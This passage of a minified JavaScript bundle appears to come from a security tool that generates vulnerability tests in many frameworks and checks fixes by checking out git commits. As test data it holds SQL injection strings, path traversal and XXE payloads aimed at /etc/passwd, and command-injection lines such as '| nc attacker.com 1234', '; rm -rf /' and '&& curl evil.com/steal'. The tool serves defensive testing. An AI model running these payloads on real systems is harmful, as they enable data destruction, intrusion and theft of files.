        with pytest.raises(ValueError):
            ${Y}(malicious_input)

    def test_${Q.type.toLowerCase()}_functionality_maintained(self):
        """${X.refactor.testName}"""
        # REFACTOR: Ensure functionality is maintained
        valid_input = "${X.green.validInput}"
        result = ${Y}(valid_input)
        assert result is not None
        assert "error" not in str(result).lower()`}generateMinitestTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.rb$/,"").split("_").map((W)=>W.charAt(0).toUpperCase()+W.slice(1)).join("")||"Module";return`require "minitest/autorun"
require "minitest/spec"
require_relative "${this.getRelativeRequirePath(Q.file||"")}"

describe ${Y} do
  describe "${Q.type} vulnerability tests" do
    it "must be vulnerable to ${Q.type.toLowerCase()} (RED)" do
      # RED: Demonstrate vulnerability exists
      malicious_input = "${X.red.attackVector}"
      result = ${Y}.new.process(malicious_input)
      _(result).wont_include "Permission denied"
      _(result).wont_include "syntax error"
    end

    it "must prevent ${Q.type.toLowerCase()} (GREEN)" do
      # GREEN: Verify fix prevents vulnerability
      malicious_input = "${X.red.attackVector}"
      _ { ${Y}.new.process(malicious_input) }.must_raise SecurityError
    end

    it "must maintain functionality (REFACTOR)" do
      # REFACTOR: Ensure functionality is maintained
      valid_input = "${X.green.validInput}"
      result = ${Y}.new.process(valid_input)
      _(result).must_be_kind_of String
      _(result).wont_be_empty
    end
  end
end`}generateRSpecTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.rb$/,"").split("_").map((z)=>z.charAt(0).toUpperCase()+z.slice(1)).join("")||"Module";return`require 'rails_helper'

RSpec.describe ${Q.file?.includes("controller")?Y:`${Y}Controller`}, type: :controller do
  describe "${Q.type} vulnerability tests" do
    context "when vulnerable to ${Q.type.toLowerCase()} (RED)" do
      it "should be exploitable with malicious input" do
        # RED: Demonstrate vulnerability exists
        malicious_input = "${X.red.attackVector}"
        
        # For SQL injection in Rails controller
        params = { user: { id: malicious_input } }
        
        # This test should pass BEFORE the fix
        expect {
          post :update, params: params
        }.not_to raise_error
        
        # The vulnerability allows SQL injection
        expect(response).to have_http_status(:ok)
      end
    end

    context "when protected against ${Q.type.toLowerCase()} (GREEN)" do
      it "should prevent exploitation attempts" do
        # GREEN: Verify fix prevents vulnerability
        malicious_input = "${X.red.attackVector}"
        
        # For SQL injection in Rails controller
        params = { user: { id: malicious_input } }
        
        # After fix, this should raise an error or sanitize input
        post :update, params: params
        
        # Either it should return an error or sanitize the input
        expect(response).to have_http_status(:bad_request).or have_http_status(:unprocessable_entity)
      end
    end

    context "when handling valid input (REFACTOR)" do
      it "should maintain normal functionality" do
        # REFACTOR: Ensure functionality is maintained
        valid_input = "${X.green.validInput}"
        
        # For normal user update
        params = { user: { id: valid_input } }
        
        post :update, params: params
        
        expect(response).to have_http_status(:ok)
        expect(assigns(:user)).not_to be_nil
      end
    end
  end
end`}generateExUnitTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.ex$/,"").split("_").map((W)=>W.charAt(0).toUpperCase()+W.slice(1)).join("")||"Module";return`defmodule ${Y}Test do
  use ExUnit.Case
  alias ${Y}

  describe "${Q.type.toLowerCase()} vulnerability" do
    test "vulnerable to malicious payload (RED)" do
      # RED: Demonstrate vulnerability exists
      malicious_input = "${X.red.attackVector}"
      assert {:ok, result} = ${Y}.process(malicious_input)
      refute String.contains?(result, "error")
    end

    test "prevents ${Q.type.toLowerCase()} attack (GREEN)" do
      # GREEN: Verify fix prevents vulnerability
      malicious_input = "${X.red.attackVector}"
      assert {:error, _} = ${Y}.process(malicious_input)
    end

    test "maintains normal functionality (REFACTOR)" do
      # REFACTOR: Ensure functionality is maintained
      valid_input = "${X.green.validInput}"
      assert {:ok, result} = ${Y}.process(valid_input)
      assert is_binary(result)
    end
  end
end`}generatePHPUnitTests(X,J,Q,Y){let W=Q.file?.split("/").pop()?.replace(/\.php$/,"")||"Class",z=Y?.version||"8.0",G=z.match(/(\d+)\./),H=G?parseInt(G[1]):8,U=H>=9,K=this.extractNamespaceFromPath(Q.file||""),V=K?`${K}\\${W}`:W,B=Y?.companions?.includes("laravel"),Z=Y?.companions?.includes("symfony");if(q.info("PHPUnit generation context",{version:z,majorVersion:H,useAttributes:U,companions:Y?.companions,isLaravel:B,isSymfony:Z}),B)return this.generateLaravelPHPUnitTests(X,J,Q,W,Y);if(Z)return this.generateSymfonyPHPUnitTests(X,J,Q,W);let M=U?`use PHPUnit\\Framework\\Attributes\\DataProvider;
use PHPUnit\\Framework\\Attributes\\Test;
use PHPUnit\\Framework\\Attributes\\Group;
`:"",F=U?"#[Group('security')]":`/**
 * @group security
 */`,j=U?"#[Test]":"",O=U?"#[DataProvider('sqlInjectionPayloads')]":`/**
     * @dataProvider sqlInjectionPayloads
     */`;return`<?php
${K?`namespace Tests\\${K};

`:""}use PHPUnit\\Framework\\TestCase;
${M}use ${V};
use App\\Exceptions\\SecurityException;

${F}
class ${W}${Q.type.replace(/_/g,"")}Test extends TestCase
{
    private $instance;

    protected function setUp(): void
    {
        $this->instance = new ${W}();
    }

    ${j}
    public function test${Q.type.replace(/_/g,"")}VulnerabilityRed(): void
    {
        // RED: Demonstrate vulnerability exists
        $maliciousInput = '${X.red.attackVector}';
        $result = $this->instance->process($maliciousInput);
        
        // Vulnerability should allow the attack to succeed
        $this->assertStringNotContainsString('Permission denied', $result);
        $this->assertStringNotContainsString('Invalid input', $result);
    }

    ${j}
    ${O}
    public function test${Q.type.replace(/_/g,"")}VulnerabilityGreen(string $payload): void
    {
        // GREEN: Verify fix prevents vulnerability
        $this->expectException(SecurityException::class);
        $this->expectExceptionMessage('Potential security threat detected');
        
        $this->instance->process($payload);
    }

    public static function sqlInjectionPayloads(): array
    {
        return [
            'union select' => ["' UNION SELECT * FROM users--"],
            'drop table' => ["'; DROP TABLE users; --"],
            'or true' => ["' OR '1'='1"],
            'exec xp_cmdshell' => ["'; EXEC xp_cmdshell('dir'); --"],
        ];
    }

    ${j}
    public function test${Q.type.replace(/_/g,"")}FunctionalityMaintained(): void
    {
        // REFACTOR: Ensure functionality is maintained
        $validInput = '${X.green.validInput}';
        $result = $this->instance->process($validInput);
        
        $this->assertNotEmpty($result);
        $this->assertIsString($result);
        $this->assertStringNotContainsString('error', strtolower($result));
    }
}`}generateJestTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.[jt]sx?$/,"")||"module",W=J.style==="bdd"?"describe":"",z=J.style==="bdd"?"it":"test",G=`const { ${Y} } = require('${this.getRelativeRequirePath(Q.file||"")}');`,H=`
${W?`describe('${Y} ${Q.type} tests', () => {`:""}
  ${z}('${X.red.testName}', async () => {
    // RED: Demonstrate vulnerability exists
    const maliciousInput = '${X.red.attackVector}';
    const result = await ${Y}(maliciousInput);
    expect(result).not.toContain('error');
  });

  ${z}('${X.green.testName}', async () => {
    // GREEN: Verify fix prevents vulnerability
    const maliciousInput = '${X.red.attackVector}';
    await expect(${Y}(maliciousInput)).rejects.toThrow();
  });

  ${z}('${X.refactor.testName}', async () => {
    // REFACTOR: Ensure functionality is maintained
    const validInput = '${X.green.validInput}';
    const result = await ${Y}(validInput);
    expect(result).toBeTruthy();
  });
${W?"});":""}`;return G+`
`+H}generateJUnit5Tests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.java$/,"")||"Class",W=this.extractPackageName(Q.file||""),z=J.companions?.includes("spring-boot"),G=`package ${W};

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import static org.junit.jupiter.api.Assertions.*;
${z?`
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.beans.factory.annotation.Autowired;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
`:""}`,H=z?`
@SpringBootTest
@AutoConfigureMockMvc
public class ${Y}${Q.type.replace(/_/g,"")}Test {
    @Autowired
    private MockMvc mockMvc;
    
    private ${Y} instance;
    
    @BeforeEach
    void setUp() {
        instance = new ${Y}();
    }`:`
public class ${Y}${Q.type.replace(/_/g,"")}Test {
    private ${Y} instance;
    
    @BeforeEach
    void setUp() {
        instance = new ${Y}();
    }`;return`${G}

${H}
    
    @Test
    @DisplayName("${X.red.testName}")
    void testSqlInjectionVulnerability() {
        // RED: Demonstrate vulnerability exists
        String maliciousInput = "${X.red.attackVector}";
        
        ${z?`// Test via Spring MVC
        assertDoesNotThrow(() -> {
            mockMvc.perform(get("/users")
                    .param("id", maliciousInput))
                    .andExpect(status().isOk());
        });`:`// Direct method test
        assertDoesNotThrow(() -> {
            instance.executeQuery(maliciousInput);
        });`}
    }
    
    @ParameterizedTest
    @ValueSource(strings = {
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1; DELETE FROM products WHERE 1=1--",
        "' UNION SELECT * FROM passwords--"
    })
    @DisplayName("Test multiple SQL injection payloads")
    void testSqlInjectionWithMultiplePayloads(String payload) {
        // Test various SQL injection attack vectors
        ${z?`assertDoesNotThrow(() -> {
            mockMvc.perform(get("/users")
                    .param("id", payload))
                    .andExpect(status().isOk());
        });`:`assertDoesNotThrow(() -> {
            instance.executeQuery(payload);
        });`}
    }
    
    @Test
    @DisplayName("${X.green.testName}")
    void testSqlInjectionPrevention() {
        // GREEN: Verify fix prevents vulnerability
        String maliciousInput = "${X.red.attackVector}";
        
        ${z?`assertThrows(Exception.class, () -> {
            mockMvc.perform(get("/users")
                    .param("id", maliciousInput))
                    .andExpect(status().isBadRequest());
        });`:`assertThrows(SecurityException.class, () -> {
            instance.executeQuery(maliciousInput);
        });`}
    }
    
    @Test
    @DisplayName("${X.refactor.testName}")
    void testNormalFunctionalityMaintained() {
        // REFACTOR: Ensure functionality is maintained
        String validInput = "${X.green.validInput}";
        
        ${z?`assertDoesNotThrow(() -> {
            mockMvc.perform(get("/users")
                    .param("id", validInput))
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.id").value(validInput));
        });`:`assertDoesNotThrow(() -> {
            var result = instance.executeQuery(validInput);
            assertNotNull(result);
            assertFalse(result.isEmpty());
        });`}
    }
}`}generateTestNGTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.java$/,"")||"Class";return`package ${this.extractPackageName(Q.file||"")};

import org.testng.annotations.Test;
import org.testng.annotations.BeforeMethod;
import org.testng.annotations.DataProvider;
import static org.testng.Assert.*;

/**
 * Security tests for ${Q.type.replace(/_/g," ")} vulnerability
 */
@Test(groups = {"security"})
public class ${Y}${Q.type.replace(/_/g,"")}Test {
    private ${Y} instance;
    
    @BeforeMethod
    public void setUp() {
        instance = new ${Y}();
    }
    
    @Test(description = "${X.red.testName}")
    public void test${Q.type.replace(/_/g,"")}Vulnerability() {
        // RED: Demonstrate vulnerability exists
        String maliciousInput = "${X.red.attackVector}";
        
        // This should succeed with vulnerable code
        try {
            String result = instance.process(maliciousInput);
            assertNotNull(result);
            ${Q.type==="xml_external_entities"?`// If XXE, might contain system file content
            assertFalse(result.contains("root:"));`:`// Verify the vulnerability is exploitable
            assertTrue(result != null);`}
        } catch (Exception e) {
            fail("Should not throw exception with vulnerable code");
        }
    }
    
    @Test(description = "${X.green.testName}")
    public void test${Q.type.replace(/_/g,"")}Prevention() {
        // GREEN: Verify fix prevents vulnerability
        String maliciousInput = "${X.red.attackVector}";
        
        // Should throw exception or return safe result
        assertThrows(SecurityException.class, () -> {
            instance.process(maliciousInput);
        });
    }
    
    ${Q.type==="path_traversal"?`
    @DataProvider(name = "maliciousFilePaths")
    public Object[][] maliciousFilePaths() {
        return new Object[][] {
            {"../../../etc/passwd"},
            {"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam"},
            {"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
            {"....//....//....//etc/passwd"}
        };
    }
    
    @Test(dataProvider = "maliciousFilePaths", 
          description = "Test path traversal with multiple payloads")
    public void testPathTraversal(String maliciousPath) {
        // Test with various path traversal payloads
        assertThrows(SecurityException.class, () -> {
            instance.readFile(maliciousPath);
        });
    }`:""}
    
    @Test(description = "${X.refactor.testName}")
    public void testNormalFunctionality() {
        // REFACTOR: Ensure functionality is maintained
        String validInput = "${X.green.validInput}";
        
        String result = instance.parseXml(validInput);
        assertNotNull(result);
        assertEquals(result.contains("error"), false);
    }
}`}generateGenericTestCode(X,J){if(!X)return`// Generic test template - adapt to your test framework
// File: ${J.file}
// Vulnerability: ${J.type}

// RED Test: Test vulnerability exists
function testVulnerabilityExists() {
  // TODO: Call vulnerable function with malicious input
  // Example: const result = vulnerableFunction(maliciousInput);
  // Assert that vulnerability is exploitable
}

// GREEN Test: Test vulnerability is fixed
function testVulnerabilityFixed() {
  // TODO: Call fixed function with same input
  // Assert that vulnerability is no longer exploitable
}`;return`// Generic test template - adapt to your test framework
// File: ${J.file}
// Vulnerability: ${J.type}

// RED Test: ${X.red.testName}
// Purpose: Demonstrate the vulnerability exists
function testVulnerabilityExists() {
  const maliciousInput = "${X.red.attackVector}";
  // TODO: Call vulnerable function with malicious input
  // TODO: Assert that attack succeeds (should fail when fixed)
}

// GREEN Test: ${X.green.testName}
// Purpose: Verify the fix prevents the vulnerability
function testVulnerabilityFixed() {
  const maliciousInput = "${X.red.attackVector}";
  // TODO: Call fixed function with malicious input
  // TODO: Assert that attack is prevented
}

// REFACTOR Test: ${X.refactor.testName}
// Purpose: Ensure normal functionality still works
function testFunctionalityMaintained() {
  const validInput = "${X.green.validInput}";
  // TODO: Call function with valid input
  // TODO: Assert expected behavior works correctly
}`}async generateAITests(X,J,Q){try{let Y=X.file?J[X.file]:void 0,W=this.detectLanguage(X.file||"",Q),z={vulnerabilityType:X.type,language:W,testFramework:Q?.name||"jest",includeE2E:!1},G=await this.aiGenerator.generateTests(X,z,Y);if(!G.success||!G.testSuite)return q.error("AI test generation failed, falling back to template-based"),this.generateGenericTests(X);return{success:!0,framework:Q?.name||"generic",testCode:G.testCode,testSuite:G.testSuite,suggestedFileName:this.suggestFileName(X.file||"test",{framework:Q}),notes:"Tests generated using AI for maximum context awareness"}}catch(Y){return q.error("Error in AI test generation",Y),this.generateGenericTests(X)}}detectLanguage(X,J){if(J){let z={jest:"javascript",mocha:"javascript",vitest:"javascript",cypress:"javascript",pytest:"python",unittest:"python",rspec:"ruby",minitest:"ruby",phpunit:"php",pest:"php",exunit:"elixir"}[J.name.toLowerCase()];if(z)return z}let Q=X.split(".").pop()?.toLowerCase();return{js:"javascript",jsx:"javascript",ts:"typescript",tsx:"typescript",py:"python",rb:"ruby",php:"php",ex:"elixir",exs:"elixir"}[Q||""]||"javascript"}async generateGenericTests(X){let J={vulnerabilityType:X.type,language:"javascript",testFramework:"bun",includeE2E:!1},Q=await this.baseGenerator.generateTestSuite(X,J);return{success:!0,framework:"generic",testCode:this.generateGenericTestCode(Q.testSuite,X),testSuite:Q.testSuite||void 0,notes:"No test framework detected, using generic template"}}async generateTestSuite(X,J){let Q=X.type.toUpperCase();if(X.type==="cross_site_request_forgery")Q="CSRF";else if(X.type==="xss")Q="XSS";let Y={vulnerabilityType:Q,language:this.getLanguageFromFramework(J.name),testFramework:this.mapToBaseFramework(J.name),includeE2E:!1},W=await this.baseGenerator.generateTestSuite(X,Y);if(!W.success||!W.testSuite){if(q.error("Test suite generation failed in generateTestSuite",{success:W.success,error:W.error,vulnerabilityType:X.type}),X.type==="xml_external_entities")return{red:{testName:"should be vulnerable to xml external entities (RED)",testCode:"// Test XXE vulnerability",attackVector:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',expectedBehavior:"should_fail_on_vulnerable_code"},green:{testName:"should prevent xml external entities (GREEN)",testCode:"// Test XXE prevention",validInput:'<?xml version="1.0"?><foo>bar</foo>',expectedBehavior:"should_pass_on_fixed_code"},refactor:{testName:"should maintain functionality after security fix",testCode:"// Test normal XML processing",functionalValidation:["XML parsing works correctly","Valid XML returns expected data"],expectedBehavior:"should_pass_on_both_versions"}};throw new Error(`Failed to generate test suite: ${W.error||"Unknown error"}`)}return W.testSuite}suggestFileName(X,J){let Q=X.substring(0,X.lastIndexOf("/")),Y=X.substring(X.lastIndexOf("/")+1),W=Y.substring(0,Y.lastIndexOf(".")),z=Y.substring(Y.lastIndexOf("."));switch(J.fileNaming){case"test":return`${Q}/${W}.test${z}`;case"spec":return`${Q}/${W}.spec${z}`;case"__tests__":return`${Q}/__tests__/${W}${z}`;case"test_prefix":return`${Q}/test_${W}${z}`;default:return`${Q}/${W}.test${z}`}}addCoverageAwareTests(X,J){if(!J.fileCoverage||J.fileCoverage.functions.length===0)return X;let Q=J.fileCoverage.functions.filter((Y)=>Y.hits===0).map((Y)=>Y.name);if(Q.length>0)return`
// Note: Focusing on uncovered functions: ${Q.join(", ")}
`+X;return X}addHelperImports(X,J){let Q=J.filter((W)=>W.includes("import")||W.includes("require")).join(`
`),Y=J.filter((W)=>W.includes("beforeEach")||W.includes("afterEach")).join(`
  `);if(Q)X=Q+`

`+X;if(Y)X=X.replace(/(describe\([^{]+\{)/,`$1
  ${Y}
`);return X}generateNotes(X,J,Q){let Y=[];if(Y.push(`Detected ${X.name} v${X.version||"unknown"}`),J.hasData){if(Y.push("Coverage data available"),J.fileCoverage){let W=J.fileCoverage.lines?.percentage||J.fileCoverage.coverage||"unknown";Y.push(`File coverage: ${W}%`)}if(J.gaps?.recommendations?.length>0)Y.push("Focused on uncovered functions")}else Y.push("No coverage data available");if(Q.style!=="unknown")Y.push(`Using ${Q.style.toUpperCase()} style`);if(Q.assertionStyle!=="unknown")Y.push(`Using ${Q.assertionStyle} assertions`);return Y.join("; ")}getLanguageFromFramework(X){return{jest:"javascript",vitest:"typescript",mocha:"javascript",jasmine:"javascript",pytest:"python",unittest:"python",rspec:"ruby",minitest:"ruby",phpunit:"php",junit:"java",junit5:"java",testng:"java",exunit:"javascript"}[X.toLowerCase()]||"javascript"}mapToBaseFramework(X){return{jest:"jest",vitest:"jest",mocha:"mocha",jasmine:"mocha",cypress:"cypress",pytest:"jest",minitest:"mocha",phpunit:"jest",exunit:"mocha"}[X.toLowerCase()]||"bun"}getRelativeImportPath(X){return X.replace(/\.tsx?$/,"").replace(/^src\//,"../")}getRelativeRequirePath(X){return"./"+X.replace(/\.(js|ts|rb|py|php)$/,"")}extractPackageName(X){let J=X.match(/src\/(?:main|test)\/java\/(.+)\/[^/]+\.java$/);if(J)return J[1].replace(/\//g,".");return"com.example"}extractNamespaceFromPath(X){if(X.includes("app/")){let J=X.match(/app\/(.+)\/[^/]+\.php$/);if(J)return J[1].replace(/\//g,"\\")}else if(X.includes("src/")){let J=X.match(/src\/(.+)\/[^/]+\.php$/);if(J)return J[1].replace(/\//g,"\\")}return""}generateLaravelPHPUnitTests(X,J,Q,Y,W){let z=this.extractNamespaceFromPath(Q.file||""),G=Q.file?.includes("Controller");return`<?php

namespace Tests\\Feature;

use Tests\\TestCase;
use Illuminate\\Foundation\\Testing\\RefreshDatabase;
use Illuminate\\Foundation\\Testing\\WithFaker;
use App\\${z?z+"\\":""}${Y};

class ${Y}${Q.type.replace(/_/g,"")}Test extends TestCase
{
    use RefreshDatabase;

    /**
     * @test
     */
    public function it_is_vulnerable_to_${Q.type.toLowerCase()}_red()
    {
        // RED: Demonstrate vulnerability exists
        $maliciousPayload = '${X.red.attackVector}';
        
        $response = $this->postJson('/api/vulnerable-endpoint', [
            'input' => $maliciousPayload
        ]);
        
        // The vulnerability should allow the attack
        $response->assertStatus(200);
        $this->assertDatabaseMissing('logs', [
            'type' => 'security_violation'
        ]);
    }

    /**
     * @test
     */
    public function it_prevents_${Q.type.toLowerCase()}_green()
    {
        // GREEN: Verify fix prevents vulnerability
        $maliciousPayload = '${X.red.attackVector}';
        
        $response = $this->postJson('/api/secure-endpoint', [
            'input' => $maliciousPayload
        ]);
        
        // The fix should block the attack
        $response->assertStatus(${Q.type==="broken_authentication"?401:400});
        $response->assertJson([
            'error' => 'Invalid input detected'
        ]);
    }

    /**
     * @test
     */
    public function it_maintains_functionality_after_fix()
    {
        // REFACTOR: Ensure functionality is maintained
        $validInput = '${X.green.validInput}';
        
        $response = $this->postJson('/api/secure-endpoint', [
            'input' => $validInput
        ]);
        
        $response->assertStatus(200);
        $response->assertJsonStructure([
            'data' => []
        ]);
    }
}`}generateSymfonyPHPUnitTests(X,J,Q,Y){let W=this.extractNamespaceFromPath(Q.file||"");return`<?php

namespace App\\Tests\\${W?W+"\\":""}Security;

use Symfony\\Bundle\\FrameworkBundle\\Test\\WebTestCase;
use App\\${W?W+"\\":""}${Y};

class ${Y}${Q.type.replace(/_/g,"")}Test extends WebTestCase
{
    /**
     * @test
     */
    public function testVulnerabilityExistsRed(): void
    {
        // RED: Demonstrate vulnerability exists
        $client = static::createClient();
        $crawler = $client->request('POST', '/vulnerable-route', [
            'data' => '${X.red.attackVector}'
        ]);
        
        $this->assertResponseIsSuccessful();
        // Vulnerability allows the attack to succeed
        $this->assertSelectorNotExists('.error-message');
    }

    /**
     * @test
     */
    public function testVulnerabilityFixedGreen(): void
    {
        // GREEN: Verify fix prevents vulnerability
        $client = static::createClient();
        $crawler = $client->request('POST', '/secure-route', [
            'data' => '${X.red.attackVector}'
        ]);
        
        $this->assertResponseStatusCodeSame(400);
        $this->assertSelectorExists('.error-message');
        $this->assertSelectorTextContains('.error-message', 'Invalid input');
    }

    /**
     * @test
     */
    public function testFunctionalityMaintained(): void
    {
        // REFACTOR: Ensure functionality is maintained
        $client = static::createClient();
        $crawler = $client->request('POST', '/secure-route', [
            'data' => '${X.green.validInput}'
        ]);
        
        $this->assertResponseIsSuccessful();
        $form = $crawler->selectButton('Submit')->form();
        $this->assertNotNull($form);
    }
}`}generatePestTests(X,J,Q,Y){let W=Q.file?.split("/").pop()?.replace(/\.php$/,"")||"Class",z=this.extractNamespaceFromPath(Q.file||""),G=z?`App\\${z}\\${W}`:`App\\${W}`,H=Y?.companions?.includes("laravel"),U=H?`use function Pest\\Laravel\\{get, post, put, delete};
use Illuminate\\Foundation\\Testing\\RefreshDatabase;`:`use ${G};
use App\\Exceptions\\SecurityException;`,V=(()=>{switch(Q.type){case"sql_injection":return`dataset('malicious_sql', [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM passwords--",
    "admin'--",
    "1' AND '1'='1"
]);`;case"command_injection":return`dataset('malicious_commands', [
    "; rm -rf /",
    "| nc attacker.com 1234",
    "\`cat /etc/passwd\`",
    "$(whoami)",
    "&& curl evil.com/steal"
]);`;case"path_traversal":return`dataset('path_traversal_payloads', [
    "../../../etc/passwd",
    "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd"
]);`;default:return""}})();if(H)return`<?php

${U}

uses(RefreshDatabase::class);

beforeEach(function () {
    $this->artisan('migrate');
});

it('should be vulnerable to ${Q.type.toLowerCase()} (RED)', function () {
    // RED: Demonstrate vulnerability exists
    $response = post('/api/vulnerable', [
        'input' => '${X.red.attackVector}'
    ]);
    
    $response->assertStatus(200);
    // Vulnerability allows the attack
    expect($response->json())->not->toHaveKey('error');
});

${V?`it('blocks ${Q.type.toLowerCase()} attempts', function ($payload) {
    // GREEN: Verify fix prevents vulnerability
    $response = post('/api/secure', [
        'input' => $payload
    ]);
    
    $response->assertStatus(400);
    expect($response->json())->toHaveKey('error');
})->with('${V.match(/dataset\('([^']+)'/)?.[1]||"payloads"}');`:""}

test('maintains functionality after fix', function () {
    // REFACTOR: Ensure functionality is maintained
    $response = post('/api/secure', [
        'input' => '${X.green.validInput}'
    ]);
    
    $response->assertStatus(200);
    expect($response->json())->toHaveKey('data');
    expect($response->json()['data'])->not->toBeEmpty();
});

${V}`;return`<?php

${U}

beforeEach(function () {
    $this->instance = new ${W}();
});

it('should be vulnerable to ${Q.type.toLowerCase()} (RED)', function () {
    // RED: Demonstrate vulnerability exists
    $maliciousInput = '${X.red.attackVector}';
    
    $result = $this->instance->process($maliciousInput);
    
    // Vulnerability should allow the attack
    expect($result)->not->toContain('Permission denied');
    expect($result)->not->toContain('Invalid input');
});

it('should prevent ${Q.type.toLowerCase()} attacks (GREEN)', function () {
    // GREEN: Verify fix prevents vulnerability
    $maliciousInput = '${X.red.attackVector}';
    
    expect(fn() => $this->instance->process($maliciousInput))
        ->toThrow(SecurityException::class)
        ->toThrow('Potential security threat detected');
});

${V?`test('blocks various ${Q.type.toLowerCase()} payloads', function ($payload) {
    expect(fn() => $this->instance->process($payload))
        ->toThrow(SecurityException::class);
})->with('${V.match(/dataset\('([^']+)'/)?.[1]||"payloads"}');`:""}

test('maintains functionality after security fix', function () {
    // REFACTOR: Ensure functionality is maintained
    $validInput = '${X.green.validInput}';
    
    $result = $this->instance->process($validInput);
    
    expect($result)->toBeString();
    expect($result)->not->toBeEmpty();
    expect($result)->not->toContain('error');
});

${V}`}}var KN=j1(()=>{HN();IX();t1();UN()});var YX;var U2=j1(()=>{uz();GN();KN();t1();YX=class YX extends QQ{frameworkDetector;coverageAnalyzer;issueInterpreter;adaptiveGenerator;constructor(X){super();this.frameworkDetector=new cz,this.coverageAnalyzer=new lz,this.issueInterpreter=new pz,this.adaptiveGenerator=new rz(this.frameworkDetector,this.coverageAnalyzer,this.issueInterpreter,X)}async analyzeWithTestGeneration(X,J,Q,Y){q.info(`Analyzing issue #${X.number} with test generation`);let W=await this.analyzeWithSecurity(X,J,Q,Y),z=W.securityAnalysis?.vulnerabilities||[];if(z.length===0){q.info("No vulnerabilities from security scan, interpreting issue description");let K=await this.issueInterpreter.interpretIssue(X);if(K.vulnerabilityType){let V=this.convertInterpretedIssueToVulnerability(K);z.push(V)}}let G=[],H;if(z.length>0&&Q){let K={};for(let[V,B]of Q.entries())K[V]=B;for(let V of z)try{let B=await this.adaptiveGenerator.generateAdaptiveTests(V,K);if(B.success&&B.testSuite){if(G.push({framework:B.framework,testCode:B.testCode,testSuite:B.testSuite,suggestedFileName:B.suggestedFileName,notes:B.notes}),!H)H=B.testSuite}}catch(B){q.error(`Failed to generate tests for vulnerability: ${V.type}`,B)}}let U={...W,generatedTests:{success:G.length>0,testSuite:H,tests:G,error:G.length===0&&z.length>0?"Failed to generate tests for detected vulnerabilities":void 0}};return q.info(`Generated ${G.length} test(s) for issue #${X.number}`),U}convertInterpretedIssueToVulnerability(X){return{type:{"sql-injection":"SQL_INJECTION",xss:"XSS","command-injection":"COMMAND_INJECTION","path-traversal":"PATH_TRAVERSAL",xxe:"XXE",ssrf:"SSRF","insecure-deserialization":"INSECURE_DESERIALIZATION"}[X.vulnerabilityType]||X.vulnerabilityType.toUpperCase(),severity:X.severity||"medium",filePath:X.affectedFiles?.[0]||"unknown",line:X.affectedLines?.[0]||0,description:X.description||"Security vulnerability detected",confidence:80,message:X.description||"Security vulnerability detected"}}}});import{execSync as K2}from"child_process";import{writeFileSync as VN,unlinkSync as BN,mkdirSync as xx1,rmSync as fx1}from"fs";import{join as qN,dirname as gx1}from"path";import{tmpdir as hx1}from"os";class iX{repoPath;workDir;constructor(X=process.cwd()){this.repoPath=X;this.workDir=qN(hx1(),`test-validator-${Date.now()}`)}async validateFixWithTests(X,J,Q){try{q.info(`Validating fix: ${X} -> ${J}`);let Y=this.createTestFile(Q),W=qN(this.workDir,"validation.test.js");xx1(gx1(W),{recursive:!0}),VN(W,Y);let z=await this.runTestsOnCommit(X,W,Q),G=await this.runTestsOnCommit(J,W,Q);try{BN(W),fx1(this.workDir,{recursive:!0,force:!0})}catch(U){}let H=this.validateResults(z,G);return{success:!0,vulnerableCommit:z,fixedCommit:G,isValidFix:H,error:H?void 0:"Fix validation failed - tests do not confirm vulnerability was fixed"}}catch(Y){return q.error("Test validation failed",Y),{success:!1,vulnerableCommit:{redTestPassed:!1,greenTestPassed:!1,refactorTestPassed:!1},fixedCommit:{redTestPassed:!1,greenTestPassed:!1,refactorTestPassed:!1},isValidFix:!1,error:Y instanceof Error?Y.message:"Unknown error"}}}async runTestsOnCommit(X,J,Q){let Y=K2("git rev-parse --abbrev-ref HEAD",{cwd:this.repoPath,encoding:"utf-8"}).trim();try{return K2(`git checkout ${X} --quiet`,{cwd:this.repoPath}),{redTestPassed:this.runSingleTest(J,"red"),greenTestPassed:this.runSingleTest(J,"green"),refactorTestPassed:this.runSingleTest(J,"refactor")}}finally{K2(`git checkout ${Y} --quiet`,{cwd:this.repoPath})}}runSingleTest(X,J){try{let Q=`
        const { execSync } = require('child_process');
        const fs = require('fs');
        const path = require('path');
        
        // Load test suite
        const testSuite = require('${X}');
        const test = testSuite.${J};
        
        // Create a proper test file with the test framework
        const testFileContent = \`
          // Minimal test runner for validation
          const assert = require('assert');
          
          // Mock test function if not available
          if (typeof test === 'undefined') {
            global.test = async (name, fn) => {
              console.log('Running test:', name);
              try {
                await fn();
                console.log(' Test passed');
              } catch (error) {
                console.error(' Test failed:', error.message);
                throw error;
              }
            };
          }
          
          // Mock expect if not available
          if (typeof expect === 'undefined') {
            global.expect = (actual) => ({
              toBe: (expected) => assert.strictEqual(actual, expected),
              toBeTruthy: () => assert.ok(actual),
              toBeFalsy: () => assert.ok(!actual),
              toContain: (substring) => assert.ok(actual.includes(substring)),
              not: {
                toBe: (expected) => assert.notStrictEqual(actual, expected),
                toContain: (substring) => assert.ok(!actual.includes(substring))
              }
            });
